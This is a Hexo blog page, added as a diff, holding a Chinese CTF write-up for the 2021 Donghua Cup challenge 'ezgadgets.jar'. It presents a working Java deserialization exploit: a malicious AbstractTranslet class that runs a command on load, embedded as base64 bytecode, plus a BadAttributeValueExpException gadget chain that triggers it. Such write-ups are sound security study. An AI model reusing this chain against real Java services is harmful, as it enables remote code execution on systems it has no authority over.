@@ -1,0 +1,203 @@
+<!DOCTYPE html>
+<html lang="ch">
+  <head>
+    
+
+    
+<script>!function(){document.documentElement.classList.toggle("dark",!0)}()</script>
+    
+
+<meta charset="utf-8" >
+
+<title>2021东华杯(ezgadgets.jar)</title>
+<meta name="keywords" content="2021东华杯(ezgadgets.jar), root@debian:~#">
+<meta name="description" content="2021东华杯反编译后，找一下核心的地方
+
+很明显，这里是有一个加载恶意类的洞
+那么提前写好恶意类，编译一下
+12345678910111213141516171819202122232425262728293031323334353637">
+<meta name="apple-mobile-web-app-capable" content="yes">
+<meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<meta property="og:title" content="2021东华杯(ezgadgets.jar)">
+<meta property="og:description" content="2021东华杯反编译后，找一下核心的地方
+
+很明显，这里是有一个加载恶意类的洞
+那么提前写好恶意类，编译一下
+12345678910111213141516171819202122232425262728293031323334353637">
+
+<link rel="shortcut icon" href="/project/images/favicon.ico">
+<link rel="stylesheet" href="/project/style/main.css">
+
+  <link rel="stylesheet" href="/project/style/simple-lightbox.min.css"><meta name="generator" content="Hexo 7.3.0"></head>
+  <body>
+    <div id="app" class="main">
+
+<div class="site-header-container">
+  <div class="site-header">
+    <div class="left">
+      <a href="https://y1shiny1shin.github.io/project">
+        <img class="avatar" src="https://q.qlogo.cn/g?b=qq&amp;nk=2729913542&amp;s=100" alt="logo" width="32px" height="32px">
+      </a>
+      <a href="https://y1shiny1shin.github.io/project">
+        <h1 class="site-title">root@debian:~#</h1>
+      </a>
+    </div>
+    <div class="right">
+        <i class="icon menu-switch icon-menu-outline" ></i>
+    </div>
+  </div>
+</div>
+
+<div class="menu-container" style="height: 0;opacity: 0;">
+<nav class="menu-list">
+  
+    
+      <a href="/project/" class="menu purple-link">
+        首页
+      </a>
+    
+  
+    
+      <a href="/project/tags" class="menu purple-link">
+        标签
+      </a>
+    
+  
+    
+      <a href="/project/archives" class="menu purple-link">
+        归档
+      </a>
+    
+  
+    
+      <a href="/project/about" class="menu purple-link">
+        关于
+      </a>
+    
+  
+</nav>
+</div>
+
+
+
+  <div class="content-container">
+    <div class="post-detail">
+      
+      <h2 class="post-title">2021东华杯(ezgadgets.jar)</h2>
+      <div class="post-info post-detail-info">
+        <span><i class="icon icon-calendar-outline"></i> 2024-11-09</span>
+        
+          <span>
+          <i class="icon icon-pricetags-outline"></i>
+            
+              <a href="/project/tags/Java/">
+              Java
+                
+              </a>
+            
+          </span>
+        
+      </div>
+      <div class="post-content-wrapper">
+        <div class="post-content">
+          <h1 id="2021东华杯"><a href="#2021东华杯" class="headerlink" title="2021东华杯"></a>2021东华杯</h1><p>反编译后，找一下核心的地方</p>
+<p><a class="simple-lightbox" target="_blank" rel="noopener" href="https://blog-1317773990.cos.ap-chengdu.myqcloud.com/image-20241106163258746.png"><img   src="/project/images/loading.svg" data-src="https://blog-1317773990.cos.ap-chengdu.myqcloud.com/image-20241106163258746.png"  alt="image-20241106163258746" lazyload></a></p>
+<p>很明显，这里是有一个加载恶意类的洞</p>
+<p>那么提前写好恶意类，编译一下</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> Seri;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.DOM;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.TransletException;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xml.internal.serializer.SerializationHandler;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 为什么一定要继承 com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;</span></span><br><span class="line"><span class="comment"> * TemplatesImpl#defineTransletClasses()方法中存在代码</span></span><br><span class="line"><span class="comment"> * ```</span></span><br><span class="line"><span class="comment"> * final Class superClass = _class[i].getSuperclass();</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * // Check if this is the main class</span></span><br><span class="line"><span class="comment"> * if (superClass.getName().equals(ABSTRACT_TRANSLET)) &#123;</span></span><br><span class="line"><span class="comment"> *     _transletIndex = i;</span></span><br><span class="line"><span class="comment"> * &#125;</span></span><br><span class="line"><span class="comment"> * ```</span></span><br><span class="line"><span class="comment"> * 会判断读取的类的父类是否为 AbstractTranslet</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ShellClass</span> <span class="keyword">extends</span> <span class="title class_">AbstractTranslet</span> &#123;</span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line">        <span class="keyword">try</span>&#123;</span><br><span class="line">            Runtime.getRuntime().exec(<span class="string">&quot;cat /flag&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e)&#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">InputStream</span> <span class="variable">inputStream</span> <span class="operator">=</span> java.lang.Runtime.getRuntime().exec(<span class="string">&quot;cat /flag&quot;</span>).getInputStream();</span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">result</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">byte</span>[] buffer = <span class="keyword">new</span> <span class="title class_">byte</span>[<span class="number">1024</span>];</span><br><span class="line">        <span class="type">int</span> length;</span><br><span class="line">        <span class="keyword">while</span> ((length = inputStream.read(buffer)) != -<span class="number">1</span>) &#123;</span><br><span class="line">            result.write(buffer, <span class="number">0</span>, length);</span><br><span class="line">        &#125;</span><br><span class="line">        System.out.println(result);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">transform</span><span class="params">(DOM document, SerializationHandler[] handlers)</span> <span class="keyword">throws</span> TransletException &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">transform</span><span class="params">(DOM document, DTMAxisIterator iterator, SerializationHandler handler)</span> <span class="keyword">throws</span> TransletException &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>编译一下</p>
+<p>那么现在的问题就是，如何触发ToStringBean#toString</p>
+<p>有很多种方法，这里就用最常用的 <code>BadAttributeValueExpException</code> </p>
+<p>然后再看</p>
+<p><a class="simple-lightbox" target="_blank" rel="noopener" href="https://blog-1317773990.cos.ap-chengdu.myqcloud.com/image-20241106164344453.png"><img   src="/project/images/loading.svg" data-src="https://blog-1317773990.cos.ap-chengdu.myqcloud.com/image-20241106164344453.png"  alt="image-20241106164344453" lazyload></a></p>
+<p>也就是说，需要在payload里面<code>writeUTF(&quot;gadgets&quot;)</code>和 <code>writeInt(2021)</code></p>
+<p>那么最后组成的payload就为</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.ezgame.ctf;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.ezgame.ctf.tools.ToStringDemo;</span><br><span class="line"><span class="keyword">import</span> com.ezgame.ctf.tools.Tools;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.management.BadAttributeValueExpException;</span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Files;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Paths;</span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Exp</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">ToStringDemo</span> <span class="variable">toStringDemo</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ToStringDemo</span>();</span><br><span class="line"></span><br><span class="line">        <span class="type">String</span> <span class="variable">shellClass</span> <span class="operator">=</span> <span class="string">&quot;yv66vgAAADMAZgoAEAA8CgA9AD4IAD8KAD0AQAoAQQBCBwBDCgAGADwKAEQARQoABgBGCQBHAEgKAEkASggASwcATAoADQBNBwBOBwBPAQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEAEkxvY2FsVmFyaWFibGVUYWJsZQEABHRoaXMBABFMU2VyaS9TaGVsbENsYXNzOwEABG1haW4BABYoW0xqYXZhL2xhbmcvU3RyaW5nOylWAQAEYXJncwEAE1tMamF2YS9sYW5nL1N0cmluZzsBAAtpbnB1dFN0cmVhbQEAFUxqYXZhL2lvL0lucHV0U3RyZWFtOwEABnJlc3VsdAEAH0xqYXZhL2lvL0J5dGVBcnJheU91dHB1dFN0cmVhbTsBAAZidWZmZXIBAAJbQgEABmxlbmd0aAEAAUkBAA1TdGFja01hcFRhYmxlBwBQBwBDBwAhAQAKRXhjZXB0aW9ucwcAUQEACXRyYW5zZm9ybQEAcihMY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTtbTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEACGRvY3VtZW50AQAtTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007AQAIaGFuZGxlcnMBAEJbTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjsHAFIBAKYoTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvZHRtL0RUTUF4aXNJdGVyYXRvcjtMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOylWAQAIaXRlcmF0b3IBADVMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9kdG0vRFRNQXhpc0l0ZXJhdG9yOwEAB2hhbmRsZXIBAEFMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOwEACDxjbGluaXQ+AQABZQEAFUxqYXZhL2xhbmcvRXhjZXB0aW9uOwcATAEAClNvdXJjZUZpbGUBAA9TaGVsbENsYXNzLmphdmEMABEAEgcAUwwAVABVAQAJY2F0IC9mbGFnDABWAFcHAFgMAFkAWgEAHWphdmEvaW8vQnl0ZUFycmF5T3V0cHV0U3RyZWFtBwBQDABbAFwMAF0AXgcAXwwAYABhBwBiDABjAGQBAARjYWxjAQATamF2YS9sYW5nL0V4Y2VwdGlvbgwAZQASAQAPU2VyaS9TaGVsbENsYXNzAQBAY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL3J1bnRpbWUvQWJzdHJhY3RUcmFuc2xldAEAE2phdmEvaW8vSW5wdXRTdHJlYW0BABNqYXZhL2lvL0lPRXhjZXB0aW9uAQA5Y29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL1RyYW5zbGV0RXhjZXB0aW9uAQARamF2YS9sYW5nL1J1bnRpbWUBAApnZXRSdW50aW1lAQAVKClMamF2YS9sYW5nL1J1bnRpbWU7AQAEZXhlYwEAJyhMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9Qcm9jZXNzOwEAEWphdmEvbGFuZy9Qcm9jZXNzAQAOZ2V0SW5wdXRTdHJlYW0BABcoKUxqYXZhL2lvL0lucHV0U3RyZWFtOwEABHJlYWQBAAUoW0IpSQEABXdyaXRlAQAHKFtCSUkpVgEAEGphdmEvbGFuZy9TeXN0ZW0BAANvdXQBABVMamF2YS9pby9QcmludFN0cmVhbTsBABNqYXZhL2lvL1ByaW50U3RyZWFtAQAHcHJpbnRsbgEAFShMamF2YS9sYW5nL09iamVjdDspVgEAD3ByaW50U3RhY2tUcmFjZQAhAA8AEAAAAAAABQABABEAEgABABMAAAAvAAEAAQAAAAUqtwABsQAAAAIAFAAAAAYAAQAAABgAFQAAAAwAAQAAAAUAFgAXAAAACQAYABkAAgATAAAAuwAEAAUAAAA5uAACEgO2AAS2AAVMuwAGWbcAB00RBAC8CE4rLbYACFk2BAKfAA4sLQMVBLYACaf/7LIACiy2AAuxAAAAAwAUAAAAHgAHAAAAIgAMACMAFAAkABoAJgAmACcAMQApADgAKgAVAAAANAAFAAAAOQAaABsAAAAMAC0AHAAdAAEAFAAlAB4AHwACABoAHwAgACEAAwAiABcAIgAjAAQAJAAAABIAAv4AGgcAJQcAJgcAJ/wAFgEAKAAAAAQAAQApAAEAKgArAAIAEwAAAD8AAAADAAAAAbEAAAACABQAAAAGAAEAAAAvABUAAAAgAAMAAAABABYAFwAAAAAAAQAsAC0AAQAAAAEALgAvAAIAKAAAAAQAAQAwAAEAKgAxAAIAEwAAAEkAAAAEAAAAAbEAAAACABQAAAAGAAEAAAA0ABUAAAAqAAQAAAABABYAFwAAAAAAAQAsAC0AAQAAAAEAMgAzAAIAAAABADQANQADACgAAAAEAAEAMAAIADYAEgABABMAAABhAAIAAQAAABK4AAISDLYABFenAAhLKrYADrEAAQAAAAkADAANAAMAFAAAABYABQAAABsACQAeAAwAHAANAB0AEQAfABUAAAAMAAEADQAEADcAOAAAACQAAAAHAAJMBwA5BAABADoAAAACADs=&quot;</span>;</span><br><span class="line">        System.out.println(shellClass);</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> toStringDemo.getClass().getDeclaredField(<span class="string">&quot;ClassByte&quot;</span>);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field.set(toStringDemo, Base64.getDecoder().decode(shellClass));</span><br><span class="line"></span><br><span class="line">        <span class="type">BadAttributeValueExpException</span> <span class="variable">b</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BadAttributeValueExpException</span>(<span class="literal">null</span>);</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field1</span> <span class="operator">=</span> b.getClass().getDeclaredField(<span class="string">&quot;val&quot;</span>);</span><br><span class="line">        field1.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field1.set(b , toStringDemo);</span><br><span class="line"></span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">baos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(baos);</span><br><span class="line">        oos.writeUTF(<span class="string">&quot;gadgets&quot;</span>);</span><br><span class="line">        oos.writeInt(<span class="number">2021</span>);</span><br><span class="line">        oos.writeObject(b);</span><br><span class="line"></span><br><span class="line">        <span class="type">String</span> <span class="variable">payload</span> <span class="operator">=</span> Tools.base64Encode(baos.toByteArray());</span><br><span class="line">        read(payload);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">read</span><span class="params">(String payload)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">        <span class="type">byte</span>[] b = Tools.base64Decode(payload);</span><br><span class="line">        <span class="type">InputStream</span> <span class="variable">inputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(b);</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">objectInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(inputStream);</span><br><span class="line">        <span class="type">String</span> <span class="variable">name</span> <span class="operator">=</span> objectInputStream.readUTF();</span><br><span class="line">        <span class="type">int</span> <span class="variable">year</span> <span class="operator">=</span> objectInputStream.readInt();</span><br><span class="line">        <span class="keyword">if</span> (name.equals(<span class="string">&quot;gadgets&quot;</span>) &amp;&amp; year == <span class="number">2021</span>)</span><br><span class="line">            objectInputStream.readObject();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>成功弹出计算器</p>
+
+        </div>
+          
+        <div class="top-div">
+          <ol class="top-box"><li class="top-box-item top-box-level-1"><a class="top-box-link" href="#2021%E4%B8%9C%E5%8D%8E%E6%9D%AF"><span class="top-box-text">2021东华杯</span></a></li></ol>
+        </div>
+          
+      </div>
+    </div>
+
+    
+      <div class="next-post">
+        <a class="purple-link" href="/project/2023/11/10/%E5%85%B3%E4%BA%8E%E5%BC%80%E5%8F%91Soer%E7%9A%84%E6%97%B6%E5%80%99%E8%A1%8D%E7%94%9F%E7%9A%84%E4%B8%80%E4%BA%9B%E6%83%B3%E6%B3%95/">
+          <h3 class="post-title">
+            下一篇：关于开发Soer的时候衍生的一些想法
+          </h3>
+        </a>
+      </div>
+    
+  </div>
+
+
+
+
+
+
+
+
+
+
+<footer>
+<div class="site-footer">
+  <div class="social-container">
+    
+      
+        <a aria-label="跳转至github" href="https://github.com/y1shiny1shin" target="_blank">
+          <i class="icon icon-github"></i>
+        </a>
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+        <a aria-label="跳转至email" href="y1shin@163.com" target="_blank">
+          <i class="icon icon-email"></i>
+        </a>
+      
+    
+      
+    
+  </div>
+  
+    Powered by <a href="https://hexo.io/" target="_blank">Hexo</a> <a href="https://github.com/f-dong/hexo-theme-minimalism" target="_blank">Theme</a>
+  
+  
+  
+  
+  
+  
+</div>
+</footer>
+
+
+      </div>
+    </div>
+    
+<script id="hexo-configurations"> window.theme_config = {"image":{"lazyload_enable":true,"photo_zoom":"simple-lightbox"}}; window.is_post = true; </script>
+
+<script src="/project/js/main.js"></script>
+
+
+
+
+
+
+  <script src="/project/js/simple-lightbox.min.js"></script><script>document.addEventListener('DOMContentLoaded', function() {new SimpleLightbox('.post-detail .simple-lightbox', {fileExt: false,captionsData:'alt'});});</script></body>
+</html>
+
